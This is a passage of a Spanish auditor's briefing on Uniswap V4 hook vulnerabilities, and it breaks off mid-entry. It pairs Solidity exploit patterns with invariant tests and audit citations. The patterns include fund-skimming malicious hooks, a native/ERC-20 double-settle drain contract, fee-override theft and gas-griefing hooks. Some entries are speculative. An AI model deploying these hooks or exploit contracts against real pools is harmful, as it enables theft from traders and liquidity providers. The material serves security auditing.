# Uniswap V4 Hooks — Combat Briefing

> Todo lo que un auditor necesita antes de revisar un hook de Uniswap V4 o un protocolo
> construido sobre la arquitectura singleton de PoolManager.
> Fuentes: OpenZeppelin Uniswap V4 Core Audit (2024), Trail of Bits Uniswap V4 Security Review (2024-07),
> Uniswap v4-core source (Hooks.sol, PoolManager.sol, TransientStateLibrary.sol),
> PositionManager periphery audit findings, investigación de seguridad comunitaria.

---

## 0. Contexto Arquitectónico

Uniswap V4 introduce cambios fundamentales vs V3:

- **Singleton PoolManager**: Todos los pools viven en UN solo contrato. No más factory + pool por par.
- **Hooks**: Contratos externos que se ejecutan en puntos del ciclo de vida (before/afterSwap, before/afterModifyLiquidity, before/afterDonate, before/afterInitialize). Las **permissions se codifican en los bits menos significativos de la dirección del hook** — no hay registry ni admin.
- **Flash Accounting con Transient Storage**: No se transfieren tokens en cada operación. Se acumulan deltas y se liquidan al final de `unlock()`. Si `NonzeroDeltaCount != 0` al cerrar, revierte.
- **ERC-6909 Claims**: Tokens fungibles internos que representan créditos sobre currencies, como alternativa a transferencias ERC-20.
- **14 Permission Flags**: BEFORE_INITIALIZE (bit 13), AFTER_INITIALIZE (12), BEFORE_ADD_LIQUIDITY (11), AFTER_ADD_LIQUIDITY (10), BEFORE_REMOVE_LIQUIDITY (9), AFTER_REMOVE_LIQUIDITY (8), BEFORE_SWAP (7), AFTER_SWAP (6), BEFORE_DONATE (5), AFTER_DONATE (4), BEFORE_SWAP_RETURNS_DELTA (3), AFTER_SWAP_RETURNS_DELTA (2), AFTER_ADD_LIQUIDITY_RETURNS_DELTA (1), AFTER_REMOVE_LIQUIDITY_RETURNS_DELTA (0).
- **Delta Return**: Hooks con flags RETURNS_DELTA pueden modificar los deltas del caller, alterando cuánto debe pagar o recibir.
- **Dynamic Fees**: Hooks pueden overridear el fee del pool en cada swap vía `lpFeeOverride`.

### Superficie de ataque principal:

1. **El hook ES código arbitrario** — el usuario confía implícitamente en el hook del pool donde opera.
2. **Los deltas devueltos por hooks modifican las obligaciones del caller** — un hook malicioso puede robar fondos vía delta manipulation.
3. **Flash accounting + transient storage** crea nuevas clases de bugs: settlement incorrecto, deltas fantasma, reentrancia dentro de `unlock()`.
4. **La dirección del hook determina sus permisos** — CREATE2 mining para address spoofing es un vector real.

---

## 1. Bugs Conocidos

### 1.1 Hook Malicioso — Robo de Fondos vía Callback

```yaml
- id: HOOK-01
  pattern: malicious-hook-callback-theft
  titulo: "Hook malicioso que roba fondos durante callbacks"
  descripcion: >
    Un hook de Uniswap V4 es código arbitrario que se ejecuta dentro del contexto
    de PoolManager.unlock(). Un hook malicioso en beforeSwap/afterSwap puede:
    (1) llamar a PoolManager.take() para extraer tokens del pool hacia sí mismo,
    (2) manipular deltas devueltos para que el usuario pague más de lo debido,
    (3) ejecutar swaps internos en otros pools para front-runear al usuario.
    El usuario no tiene visibilidad directa sobre qué hace el hook — confía
    ciegamente al interactuar con un pool que tiene hook adjunto. Esto es
    análogo a aprobar un contrato malicioso, pero peor porque el hook se
    ejecuta automáticamente en cada operación del pool.
  patron_vulnerable: |
    // Hook malicioso que roba tokens durante afterSwap
    contract MaliciousHook is BaseHook {
        function afterSwap(
            address sender,
            PoolKey calldata key,
            IPoolManager.SwapParams calldata params,
            BalanceDelta delta,
            bytes calldata hookData
        ) external override returns (bytes4, int128) {
            // El hook tiene acceso al PoolManager dentro de unlock()
            // Puede tomar tokens del pool directamente
            uint256 stolenAmount = poolManager.balanceOf(address(this), key.currency0.toId());
            poolManager.take(key.currency0, address(this), stolenAmount);

            // O devolver un delta que reduce lo que el usuario recibe
            // afterSwapReturnsDelta: el hook se queda con parte del output
            int128 hookDelta = int128(int256(delta.amount1()) / 10); // roba 10%
            return (BaseHook.afterSwap.selector, hookDelta);
        }
    }
  test_invariante: |
    // Invariante: el usuario debe recibir al menos amountOutMinimum
    function invariant_user_receives_expected_output() public {
        uint256 balanceBefore = token1.balanceOf(user);
        // ... ejecutar swap ...
        uint256 balanceAfter = token1.balanceOf(user);
        uint256 received = balanceAfter - balanceBefore;
        // El delta devuelto por el hook no debe reducir el output
        // más allá del fee legítimo del pool
        assert(received >= expectedAmountOut * 99 / 100); // 1% tolerance para fees
    }
  ejemplo_real:
    - "OpenZeppelin Uniswap V4 Audit — ERC-20 representation of native currency drains native pools (CRITICAL). Attacker settles native via msg.value then settles ERC-20 representation without transfer, exploiting dual-address tokens on Celo/Polygon/zkSync."
    - "Trail of Bits Uniswap V4 Review (2024-07) — Multiple unsafe assembly blocks where hook return data > 64 bytes overwrites free memory pointer, enabling memory corruption."
    - "Concepto general: cualquier protocolo que integra pools con hooks no auditados expone a sus usuarios a código arbitrario sin consentimiento explícito."
  severidad: critical
  confianza: alta
  verificado: true
  tags: [hook, malicious, callback, theft, delta-manipulation, trust]
  relacionado_con: [HOOK-05, HOOK-14]
```

### 1.2 Hook Permission Flag Spoofing via Address Mining

```yaml
- id: HOOK-02
  pattern: hook-permission-flag-spoofing
  titulo: "Spoofing de flags de permisos mediante minado de dirección"
  descripcion: >
    Los permisos de un hook se determinan por los 14 bits menos significativos
    de su dirección de deployment. Un atacante puede usar CREATE2 con salt mining
    para deployar un hook en una dirección que tenga flags que no corresponden
    con su funcionalidad declarada. Por ejemplo, un hook que se presenta como
    "solo beforeSwap" pero cuya dirección activa BEFORE_SWAP_RETURNS_DELTA,
    permitiéndole manipular los deltas del swap. La validación
    validateHookPermissions() en el constructor solo verifica consistencia
    address↔flags, pero no valida que los flags sean seguros para los usuarios.
    El hook puede obtener permisos peligrosos (RETURNS_DELTA) sin que los
    integradores lo detecten si solo miran el código fuente sin verificar la
    dirección de deployment.
  patron_vulnerable: |
    // Atacante mina una dirección con BEFORE_SWAP_RETURNS_DELTA activado
    // aunque el código "visible" no lo usa
    contract StealthDeltaHook is BaseHook {
        constructor(IPoolManager _pm) BaseHook(_pm) {
            // validateHookPermissions solo verifica que address bits
            // coincidan con los permissions declarados — si el atacante
            // declara TODOS los flags, pasa la validación
            Hooks.validateHookPermissions(this, getHookPermissions());
        }

        function getHookPermissions() public pure override returns (Hooks.Permissions memory) {
            return Hooks.Permissions({
                beforeInitialize: false,
                afterInitialize: false,
                beforeAddLiquidity: false,
                afterAddLiquidity: false,
                beforeRemoveLiquidity: false,
                afterRemoveLiquidity: false,
                beforeSwap: true,
                afterSwap: false,
                beforeDonate: false,
                afterDonate: false,
                beforeSwapReturnsDelta: true, // Flag peligroso - oculto en "getHookPermissions"
                afterSwapReturnsDelta: false,
                afterAddLiquidityReturnsDelta: false,
                afterRemoveLiquidityReturnsDelta: false
            });
        }

        function beforeSwap(address, PoolKey calldata, IPoolManager.SwapParams calldata params, bytes calldata)
            external override returns (bytes4, BeforeSwapDelta, uint24)
        {
            // Usa BEFORE_SWAP_RETURNS_DELTA para robar parte del swap
            int128 specifiedDelta = int128(params.amountSpecified / 20); // 5% theft
            BeforeSwapDelta hookDelta = toBeforeSwapDelta(specifiedDelta, 0);
            return (this.beforeSwap.selector, hookDelta, 0);
        }
    }
  test_invariante: |
    // Verificar que la dirección del hook NO tiene flags RETURNS_DELTA
    // a menos que sea un hook auditado y confiable
    function check_hook_no_hidden_delta_flags(address hook) public pure {
        uint160 addr = uint160(hook);
        bool hasBeforeSwapReturnsDelta = (addr & (1 << 3)) != 0;
        bool hasAfterSwapReturnsDelta = (addr & (1 << 2)) != 0;
        bool hasAfterAddLiqReturnsDelta = (addr & (1 << 1)) != 0;
        bool hasAfterRemoveLiqReturnsDelta = (addr & (1 << 0)) != 0;
        // Flags RETURNS_DELTA son los más peligrosos — deben auditarse
        assert(!hasBeforeSwapReturnsDelta || isTrustedHook(hook));
        assert(!hasAfterSwapReturnsDelta || isTrustedHook(hook));
    }
  ejemplo_real:
    - "Uniswap V4 Core — isValidHookAddress() valida que delta-return flags requieren sus action flags correspondientes (e.g., BEFORE_SWAP_RETURNS_DELTA requiere BEFORE_SWAP_FLAG), pero NO valida si los flags son apropiados para la funcionalidad declarada del hook."
    - "CREATE2 address mining es práctica común — Uniswap provee HookMiner.sol para encontrar direcciones con bits específicos. Un atacante usa el mismo tooling."
  severidad: high
  confianza: alta
  verificado: true
  tags: [hook, permission, address-mining, CREATE2, flag-spoofing, trust-assumption]
  relacionado_con: [HOOK-01, HOOK-05]
```

### 1.3 Reentrancia a través de Hook Callbacks

```yaml
- id: HOOK-03
  pattern: hook-callback-reentrancy
  titulo: "Reentrancia dentro de unlock() vía hooks que re-entran al PoolManager"
  descripcion: >
    El PoolManager usa un mecanismo de lock/unlock que permite operaciones
    anidadas DENTRO del mismo unlock(). Un hook malicioso o vulnerable puede,
    durante su callback (e.g., beforeSwap), llamar de nuevo al PoolManager
    para ejecutar swaps adicionales, modificar liquidez, o donar — todo
    dentro de la misma transacción y el mismo contexto de unlock(). Esto
    no es reentrancia clásica (el lock lo permite) sino reentrancia LÓGICA:
    el hook puede manipular el estado del pool entre el "before" y el "after"
    de la operación principal, causando que la operación original se ejecute
    sobre un estado ya modificado. El modifier noSelfCall previene que el
    hook se llame a sí mismo, pero NO previene que llame a PoolManager.
  patron_vulnerable: |
    contract ReentrantHook is BaseHook {
        bool private _reentering;

        function beforeSwap(
            address sender,
            PoolKey calldata key,
            IPoolManager.SwapParams calldata params,
            bytes calldata hookData
        ) external override returns (bytes4, BeforeSwapDelta, uint24) {
            if (!_reentering) {
                _reentering = true;
                // Re-entra al PoolManager durante beforeSwap
                // Ejecuta un swap en dirección opuesta para front-runear
                IPoolManager.SwapParams memory frontRunParams = IPoolManager.SwapParams({
                    zeroForOne: !params.zeroForOne,
                    amountSpecified: params.amountSpecified / 2,
                    sqrtPriceLimitX96: params.zeroForOne
                        ? TickMath.MAX_SQRT_PRICE - 1
                        : TickMath.MIN_SQRT_PRICE + 1
                });
                // Esto es válido — PoolManager permite operaciones anidadas
                poolManager.swap(key, frontRunParams, "");
                _reentering = false;
            }
            return (this.beforeSwap.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, 0);
        }
    }
  test_invariante: |
    // Invariante: el precio del pool no debe cambiar entre beforeSwap y afterSwap
    // más allá del impacto del swap del usuario
    function invariant_no_price_manipulation_during_swap() public {
        (uint160 sqrtPriceBefore,,,) = poolManager.getSlot0(poolId);
        // ... execute user swap ...
        (uint160 sqrtPriceAfter,,,) = poolManager.getSlot0(poolId);
        // El cambio de precio debe corresponder SOLO al swap del usuario
        // No a swaps internos del hook
        uint256 priceImpact = sqrtPriceAfter > sqrtPriceBefore
            ? sqrtPriceAfter - sqrtPriceBefore
            : sqrtPriceBefore - sqrtPriceAfter;
        assert(priceImpact <= maxExpectedImpact);
    }
  ejemplo_real:
    - "OpenZeppelin V4 Audit — noDelegateCall modifier solo protege unlock(), no todas las funciones externas. Bypass posible vía contrato custom que replica la lógica de slots. Resuelto extendiendo noDelegateCall a todas las funciones externas."
    - "La arquitectura V4 permite reentrancia controlada (nested operations dentro de unlock). Esto es by-design pero crea un modelo de amenaza completamente nuevo para hooks."
  severidad: high
  confianza: alta
  verificado: true
  tags: [reentrancy, hook, callback, nested-operations, unlock, front-running]
  relacionado_con: [HOOK-01, HOOK-13]
```

### 1.4 Flash Accounting — Manipulación de Deltas con Transient Storage

```yaml
- id: HOOK-04
  pattern: flash-accounting-delta-manipulation
  titulo: "Manipulación de deltas en flash accounting con transient storage"
  descripcion: >
    V4 usa transient storage (EIP-1153) para rastrear deltas de currencies
    por dirección. Los tokens no se transfieren hasta el final de unlock() —
    solo se acumulan deltas. Un hook o integrador puede explotar esto:
    (1) settle() una currency con msg.value y luego settle() la representación
    ERC-20 de la misma currency nativa sin transferir tokens (exploit real
    encontrado por OpenZeppelin), (2) manipular el orden de sync/settle para
    crear deltas fantasma, (3) explotar que currencyDelta() no tiene validación
    explícita y depende de la integridad del caller upstream. El sistema
    confía en que NonzeroDeltaCount llegue a 0 al final, pero un atacante
    puede crear pares de deltas que se cancelan mientras extrae valor.
  patron_vulnerable: |
    // Exploit real de OpenZeppelin: native currency con ERC-20 representation
    // En chains como Celo, Polygon, zkSync donde ETH tiene dirección ERC-20
    contract FlashAccountingExploit {
        IPoolManager poolManager;

        function exploit(Currency nativeCurrency, Currency erc20Representation) external payable {
            poolManager.unlock(abi.encode(nativeCurrency, erc20Representation));
        }

        function unlockCallback(bytes calldata data) external returns (bytes memory) {
            (Currency native, Currency erc20) = abi.decode(data, (Currency, Currency));

            // Step 1: sync native currency
            poolManager.sync(native);

            // Step 2: settle native con msg.value — incrementa balance del contrato
            poolManager.settle{value: 1 ether}();
            // Ahora el delta de native es -1 ether (PoolManager debe al caller)

            // Step 3: sync ERC-20 representation (MISMA currency, distinta dirección)
            poolManager.sync(erc20);

            // Step 4: settle ERC-20 SIN transferir tokens
            // El balance ya subió por el msg.value del paso 2
            poolManager.settle(); // Lee balance increase del paso 2 otra vez!
            // Ahora delta de erc20 es también -1 ether

            // Step 5: take 2 ether total — 1 ether de profit
            poolManager.take(native, address(this), 2 ether);
            // Deltas se cancelan: -1 (native) + -1 (erc20) + 2 (take) = 0
            return "";
        }
    }
  test_invariante: |
    // Invariante: sync+settle de una currency solo puede acreditar
    // el monto realmente transferido al PoolManager
    function invariant_settle_matches_actual_transfer() public {
        uint256 pmBalanceBefore = address(poolManager).balance;
        // ... ejecutar operación ...
        uint256 pmBalanceAfter = address(poolManager).balance;
        int256 totalDelta = poolManager.currencyDelta(address(this), nativeCurrency);
        // El delta acreditado no puede exceder lo realmente transferido
        assert(uint256(-totalDelta) <= pmBalanceAfter - pmBalanceBefore);
    }
  ejemplo_real:
    - "OpenZeppelin Uniswap V4 Core Audit — CRITICAL: ERC-20 representation of native currency can drain native pools. Chains con dual-address (Celo, Polygon, zkSync). Atacante settlea msg.value + ERC-20 sin transferir, drena el doble. RESUELTO: sync+settle ahora requiere que settle use la misma currency que el último sync."
    - "TransientStateLibrary — currencyDelta() no tiene validación propia, depende de caller. getSyncedReserves() sí valida currency synced."
  severidad: critical
  confianza: alta
  verificado: true
  tags: [flash-accounting, transient-storage, delta, settle, sync, native-currency, dual-address]
  relacionado_con: [HOOK-09, HOOK-11]
```

### 1.5 Extracción de Fees por Hook Malicioso

```yaml
- id: HOOK-05
  pattern: hook-fee-extraction
  titulo: "Hook que sobrecobra o sifona fees dinámicos"
  descripcion: >
    Los hooks con permiso de dynamic fee pueden overridear el fee del pool
    en cada swap devolviendo un lpFeeOverride en beforeSwap(). Un hook
    malicioso puede: (1) establecer fees del 100% para robar todo el output
    del swap, (2) cambiar fees dinámicamente según quién es el sender para
    discriminar usuarios, (3) cobrar fees altos y redirigir el exceso a su
    propia dirección vía donate() o take(). El flag isDynamicFee() en el
    PoolKey permite que un hook controle completamente la estructura de fees.
    Además, hooks con RETURNS_DELTA pueden extraer valor equivalente a un
    fee oculto sin que aparezca como fee en la UI.
  patron_vulnerable: |
    contract FeeTheftHook is BaseHook {
        address private immutable thief;

        constructor(IPoolManager _pm, address _thief) BaseHook(_pm) {
            thief = _thief;
        }

        function beforeSwap(
            address sender,
            PoolKey calldata key,
            IPoolManager.SwapParams calldata params,
            bytes calldata hookData
        ) external override returns (bytes4, BeforeSwapDelta, uint24) {
            // Override fee al máximo permitido (100% = 1_000_000)
            // O un fee sutil del 5% que pasa desapercibido
            uint24 maliciousFee = 50_000; // 5% fee override

            // Alternativamente, usar BEFORE_SWAP_RETURNS_DELTA para robar
            // sin tocar el fee visible
            int128 stolenDelta = int128(params.amountSpecified / 20);
            BeforeSwapDelta hookDelta = toBeforeSwapDelta(stolenDelta, 0);

            return (this.beforeSwap.selector, hookDelta, maliciousFee | LPFeeLibrary.OVERRIDE_FEE_FLAG);
        }
    }
  test_invariante: |
    // Invariante: el fee efectivo del swap no debe exceder el fee declarado del pool
    function invariant_fee_within_declared_bounds() public {
        uint256 amountIn = 1 ether;
        uint256 expectedMinOut = getQuoteWithMaxFee(amountIn, declaredFee);
        // Ejecutar swap
        uint256 actualOut = executeSwap(amountIn);
        // El output real no debe ser menor al esperado con fee máximo declarado
        assert(actualOut >= expectedMinOut);
    }
  ejemplo_real:
    - "Uniswap V4 Hooks.sol — beforeSwap puede devolver lpFeeOverride con OVERRIDE_FEE_FLAG para cambiar el fee del pool en cada swap. El PoolManager aplica este override sin validar contra un máximo razonable — solo verifica que no exceda MAX_LP_FEE (100%)."
    - "OpenZeppelin V4 Audit — ProtocolFeeController gas griefing: controller malicioso retorna datos enormes que inflan el gas del caller. Resuelto con assembly que copia solo 32 bytes."
  severidad: high
  confianza: alta
  verificado: true
  tags: [hook, fee, dynamic-fee, lpFeeOverride, extraction, theft]
  relacionado_con: [HOOK-01, HOOK-12]
```

### 1.6 Front-Running de Inicialización de Pool con Hook Malicioso

```yaml
- id: HOOK-06
  pattern: pool-initialization-frontrun
  titulo: "Front-running de inicialización de pool para establecer precio manipulado"
  descripcion: >
    En V4, el sqrtPriceX96 de inicialización no forma parte de la identidad
    del pool (PoolKey no incluye el precio inicial). Un atacante puede
    front-runear la transacción de initialize() de un LP legítimo para:
    (1) inicializar el pool a un precio extremadamente distorsionado,
    (2) esperar que el LP deposite liquidez al precio falso,
    (3) arbitrar la diferencia al precio real. Peor aún, si el pool tiene
    un hook con beforeInitialize, el hook puede ejecutar lógica arbitraria
    durante la inicialización (configurar parámetros maliciosos, registrar
    al atacante como privilegiado, etc). OpenZeppelin encontró este issue
    y Uniswap lo reconoció como "mitigado por periphery slippage protection".
  patron_vulnerable: |
    // Atacante front-runea initialize() con precio manipulado
    contract PoolInitFrontRunner {
        IPoolManager poolManager;

        function frontRunInitialize(
            PoolKey calldata key,
            uint160 manipulatedSqrtPrice
        ) external {
            // Inicializa el pool antes que el LP legítimo
            // con un precio que beneficia al atacante
            poolManager.initialize(key, manipulatedSqrtPrice);
            // El LP legítimo no puede re-inicializar (pool ya existe)
            // Si deposita liquidez al precio falso, pierde fondos
        }
    }

    // Hook malicioso que se auto-configura durante initialize
    contract InitExploitHook is BaseHook {
        address public privilegedAddress;

        function beforeInitialize(
            address sender,
            PoolKey calldata key,
            uint160 sqrtPriceX96
        ) external override returns (bytes4) {
            // El hook registra al creador como dirección privilegiada
            // para futuras operaciones con fee reducido o delta favorable
            privilegedAddress = sender;
            return this.beforeInitialize.selector;
        }
    }
  test_invariante: |
    // Invariante: el precio de inicialización debe estar dentro de un rango
    // razonable del precio de mercado del par
    function check_init_price_reasonable(uint160 sqrtPriceX96) public view {
        uint256 price = uint256(sqrtPriceX96) * uint256(sqrtPriceX96) / (1 << 192);
        uint256 oraclePrice = getOraclePrice(token0, token1);
        // El precio de init no debe desviarse más de 10% del oracle
        assert(price >= oraclePrice * 90 / 100);
        assert(price <= oraclePrice * 110 / 100);
    }
  ejemplo_real:
    - "OpenZeppelin V4 Audit — MEDIUM: Front-running pool initialization or initial deposit leading to liquidity drain. sqrtPriceX96 no es parte del PoolKey, atacante inicializa a precio arbitrario. STATUS: Acknowledged — Uniswap indica que periphery contracts con slippage protection mitigan el riesgo."
    - "Análogo V2/V3: ataques de first depositor en pools nuevos son bien documentados — V4 hereda el mismo riesgo con la capa adicional de hooks."
  severidad: medium
  confianza: alta
  verificado: true
  tags: [initialization, front-running, sqrtPrice, hook, beforeInitialize, first-depositor]
  relacionado_con: [HOOK-07, HOOK-12]
```

### 1.7 Ataque de Migración/Upgrade de Hook

```yaml
- id: HOOK-07
  pattern: hook-upgrade-migration-attack
  titulo: "Cambio de hook address en pool existente o hook upgradeable"
  descripcion: >
    En V4, la dirección del hook es parte del PoolKey y por tanto parte de
    la identidad del pool. NO se puede cambiar el hook de un pool existente.
    Sin embargo, el riesgo real viene de hooks que son proxy contracts (e.g.,
    UUPS, TransparentProxy) donde el admin puede cambiar la implementación.
    Un hook deployado como proxy puede pasar auditoría con una implementación
    benigna y luego upgradear a una implementación maliciosa. Los LPs que
    depositaron en el pool confían en el código del hook al momento del
    depósito, pero la implementación puede cambiar bajo sus pies. Además,
    pools con hooks distintos pero mismos tokens son pools DIFERENTES —
    la liquidez se fragmenta, y un atacante puede crear pools "clon" con
    hooks maliciosos para confundir a routers.
  patron_vulnerable: |
    // Hook deployado como proxy upgradeable
    contract UpgradeableHook is UUPSUpgradeable, BaseHook {
        address private _admin;

        function _authorizeUpgrade(address newImplementation) internal override {
            require(msg.sender == _admin, "Not admin");
            // Sin timelock, sin governance — admin puede upgradear instantáneamente
        }

        // Implementación inicial: benigna, pasa auditoría
        function beforeSwap(...) external override returns (...) {
            return (this.beforeSwap.selector, ZERO_DELTA, 0);
        }
    }

    // Después del upgrade:
    contract MaliciousImplementation {
        function beforeSwap(...) external returns (...) {
            // Ahora roba fondos
            int128 theft = int128(params.amountSpecified / 10);
            return (bytes4(0x...), toBeforeSwapDelta(theft, 0), 0);
        }
    }
  test_invariante: |
    // Verificar que el hook NO es un proxy upgradeable
    function check_hook_not_upgradeable(address hook) public view {
        // Verificar que no hay storage slot de implementación (EIP-1967)
        bytes32 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 storedImpl;
        assembly { storedImpl := sload(implSlot) }
        // Si hay una implementación almacenada, el hook es proxy
        assert(storedImpl == bytes32(0)); // Hook no debe ser proxy
    }
  ejemplo_real:
    - "Concepto general: múltiples DeFi exploits han involucrado upgrades maliciosos de proxies (Wormhole, Ronin Bridge admin compromise). V4 hooks heredan este vector si se deployean como proxies."
    - "El PoolKey incluye la dirección del hook — cambiar el hook requiere un pool nuevo. Pero un proxy mantiene la misma dirección con diferente implementación."
  severidad: high
  confianza: alta
  verificado: true
  tags: [hook, upgrade, proxy, UUPS, migration, admin, trust]
  relacionado_con: [HOOK-01, HOOK-02]
```

### 1.8 Colisión de Storage en Singleton PoolManager

```yaml
- id: HOOK-08
  pattern: singleton-storage-collision
  titulo: "Colisión de storage entre pools en el contrato singleton"
  descripcion: >
    En V4, todos los pools comparten el mismo contrato (PoolManager). El
    estado de cada pool se almacena en un mapping indexado por PoolId
    (hash del PoolKey). Si el cálculo del PoolId tiene colisiones (dos
    PoolKeys distintos generan el mismo hash), un atacante podría manipular
    el estado de un pool legítimo creando un pool "colisionante". Aunque
    keccak256 hace esto criptográficamente improbable para colisiones
    accidentales, el riesgo real es más sutil: hooks que almacenan estado
    propio en el PoolManager (vía ERC-6909 claims o storage directo) pueden
    tener colisiones si usan keys derivados incorrectamente. Un hook que
    usa un mapping(PoolId => ...) sin incluir su propia dirección en el key
    puede tener cross-pool state pollution.
  patron_vulnerable: |
    // Hook que almacena estado por pool sin aislamiento adecuado
    contract BadStorageHook is BaseHook {
        // VULNERABLE: solo indexa por PoolId, no por (PoolId, hookAddress)
        mapping(PoolId => uint256) public accumulatedFees;
        mapping(PoolId => address) public rewardRecipient;

        function afterSwap(
            address sender,
            PoolKey calldata key,
            IPoolManager.SwapParams calldata,
            BalanceDelta delta,
            bytes calldata
        ) external override returns (bytes4, int128) {
            PoolId id = key.toId();
            // Si dos pools usan el mismo hook pero con parámetros distintos,
            // y el PoolId colisiona (improbable pero posible con PoolKeys
            // cuidadosamente crafteados), los fees se mezclan
            accumulatedFees[id] += uint256(int256(delta.amount0()));
            return (this.afterSwap.selector, 0);
        }
    }
  test_invariante: |
    // Invariante: estado del pool A no debe ser accesible/modificable
    // desde operaciones del pool B
    function invariant_pool_state_isolation() public {
        uint256 feesPoolA = hook.accumulatedFees(poolIdA);
        // Ejecutar swap en pool B
        executeSwap(poolKeyB, ...);
        // Los fees del pool A no deben cambiar
        assert(hook.accumulatedFees(poolIdA) == feesPoolA);
    }
  ejemplo_real:
    - "Concepto general: storage collision en Diamond pattern (EIP-2535) y proxies han causado múltiples exploits. El singleton de V4 introduce una superficie similar pero con PoolId-based isolation."
    - "Uniswap V4 usa PoolId = keccak256(abi.encode(PoolKey)) — criptográficamente seguro contra colisiones, pero hooks con storage propio deben replicar esta disciplina."
  severidad: medium
  confianza: media
  verificado: false
  tags: [singleton, storage-collision, PoolId, isolation, cross-pool, hook-state]
  relacionado_con: [HOOK-13, HOOK-11]
```

### 1.9 Manipulación de Delta Resolution

```yaml
- id: HOOK-09
  pattern: delta-resolution-manipulation
  titulo: "Manipulación de resolución de deltas al final de unlock()"
  descripcion: >
    Al final de unlock(), el PoolManager verifica que NonzeroDeltaCount == 0.
    Esto significa que TODOS los deltas deben resolverse (settle o take para
    cada currency). Un atacante puede explotar esto de varias formas:
    (1) crear deltas artificiales que se cancelan entre sí pero extraen valor
    real (como el exploit de native/ERC-20 de OpenZeppelin), (2) usar
    ERC-6909 mint/burn para resolver deltas sin transferencias reales,
    (3) explotar rounding en la conversión entre deltas y amounts para
    crear "dust profits" acumulables. El hecho de que settle() calcula
    el delta como diferencia de balances (actual - synced) crea oportunidades
    para manipular el balance entre sync() y settle().
  patron_vulnerable: |
    contract DeltaManipulator {
        function unlockCallback(bytes calldata) external returns (bytes memory) {
            // Estrategia: crear delta positivo en currency A
            // y delta negativo en currency B que se cancelan en valor
            // pero explotan diferencias de precio

            // 1. Swap para crear delta en currency0
            poolManager.swap(key, swapParams, "");

            // 2. Settle currency0 con ERC-6909 claims en lugar de tokens reales
            poolManager.burn(address(this), key.currency0.toId(), amount0);

            // 3. Take currency1 en tokens reales
            poolManager.take(key.currency1, address(this), amount1);

            // 4. Los deltas se cancelan (NonzeroDeltaCount = 0)
            // pero el atacante convirtió claims en tokens reales
            return "";
        }
    }
  test_invariante: |
    // Invariante: el balance total del PoolManager en cada currency
    // no debe disminuir después de un unlock() completo
    function invariant_poolmanager_balance_non_decreasing() public {
        uint256 bal0Before = token0.balanceOf(address(poolManager));
        uint256 bal1Before = token1.balanceOf(address(poolManager));
        // ... ejecutar unlock callback ...
        uint256 bal0After = token0.balanceOf(address(poolManager));
        uint256 bal1After = token1.balanceOf(address(poolManager));
        assert(bal0After >= bal0Before);
        assert(bal1After >= bal1Before);
    }
  ejemplo_real:
    - "OpenZeppelin V4 Audit — CRITICAL: settle() calcula delta como balance_actual - synced_reserves. Si el balance sube por una vía (msg.value) y se settlea por otra (ERC-20), el delta se acredita dos veces."
    - "La función clear() en PoolManager permite forgive deltas sin transferencia — diseñada para dust, pero podría ser explotada si no hay límites."
  severidad: critical
  confianza: alta
  verificado: true
  tags: [delta, resolution, settle, take, flash-accounting, balance-manipulation]
  relacionado_con: [HOOK-04, HOOK-11]
```

### 1.10 Gas Griefing por Hook

```yaml
- id: HOOK-10
  pattern: hook-gas-griefing
  titulo: "Hook que consume gas excesivo para DoS de operaciones del pool"
  descripcion: >
    Un hook puede consumir gas arbitrario durante sus callbacks, causando
    que swaps, adiciones de liquidez, o remociones fallen por out-of-gas.
    No hay límite de gas impuesto por el PoolManager a los hooks — el hook
    recibe todo el gas disponible. Un hook malicioso puede: (1) ejecutar
    loops infinitos que consumen todo el gas, (2) hacer SSTORE masivos para
    inflar el gas, (3) retornar datos enormes que se copian a memory
    (encontrado por OpenZeppelin en protocolFeeController). Esto puede usarse
    para: bloquear liquidaciones (el hook previene removeLiquidity), bloquear
    swaps selectivamente (solo cuando el precio es desfavorable para el
    atacante), o crear condiciones de carrera donde solo transacciones con
    gas extremadamente alto pueden pasar.
  patron_vulnerable: |
    contract GasGriefHook is BaseHook {
        mapping(uint256 => uint256) private _wasteStorage;
        uint256 private _counter;

        function beforeSwap(
            address sender,
            PoolKey calldata key,
            IPoolManager.SwapParams calldata params,
            bytes calldata hookData
        ) external override returns (bytes4, BeforeSwapDelta, uint24) {
            // Opción 1: loop que consume todo el gas
            if (shouldBlock(sender, params)) {
                for (uint256 i = 0; i < type(uint256).max; i++) {
                    _wasteStorage[i] = i; // SSTORE masivo
                }
            }

            // Opción 2: retornar datos enormes (memory expansion attack)
            // No aplica aquí porque el retorno está tipado, pero sí
            // aplica en protocolFeeController (ver OZ finding)

            return (this.beforeSwap.selector, ZERO_DELTA, 0);
        }

        function shouldBlock(address sender, IPoolManager.SwapParams calldata params)
            internal view returns (bool)
        {
            // Solo bloquea swaps que serían desfavorables para el atacante
            // e.g., liquidaciones, arbitraje contra posición del atacante
            return params.zeroForOne && sender == liquidatorAddress;
        }
    }
  test_invariante: |
    // Invariante: cualquier operación del pool debe completarse
    // con un gas razonable (< 500K gas para el hook)
    function invariant_hook_gas_bounded() public {
        uint256 gasBefore = gasleft();
        try poolManager.swap{gas: 1_000_000}(key, swapParams, "") {
            uint256 gasUsed = gasBefore - gasleft();
            assert(gasUsed < 500_000); // Hook no debe usar más de 500K
        } catch {
            // Si falla con 1M gas, el hook es griefing
            assert(false);
        }
    }
  ejemplo_real:
    - "OpenZeppelin V4 Audit — MEDIUM: ProtocolFeeController gas griefing. Controller malicioso retorna datos enormes que se cargan en memory, inflando el gas cost. RESUELTO: assembly-based call que copia solo 32 bytes."
    - "Concepto general: hooks sin gas limit son análogos a callbacks sin gas limit en ERC-777 — vector conocido de DoS."
  severidad: medium
  confianza: alta
  verificado: true
  tags: [gas-griefing, DoS, hook, callback, gas-limit, memory-expansion]
  relacionado_con: [HOOK-01, HOOK-03]
```

### 1.11 Manipulación de ERC-6909 Claim Tokens

```yaml
- id: HOOK-11
  pattern: erc6909-claim-manipulation
  titulo: "Manipulación de tokens de claim ERC-6909 para resolver deltas sin transferencia real"
  descripcion: >
    El PoolManager implementa ERC-6909 para emitir claim tokens que representan
    créditos sobre currencies. Un usuario puede mint() claims en lugar de
    hacer take() de tokens reales, y burn() claims en lugar de settle() con
    tokens reales. Esto crea un sistema de "IOUs" interno. Los riesgos son:
    (1) un hook puede mint claims para sí mismo durante callbacks y luego
    burn() para resolver deltas sin nunca transferir tokens, (2) la
    especificación ERC-6909 tiene discrepancias con la implementación de V4
    (encontrado por OpenZeppelin) — transfers donde sender==caller no
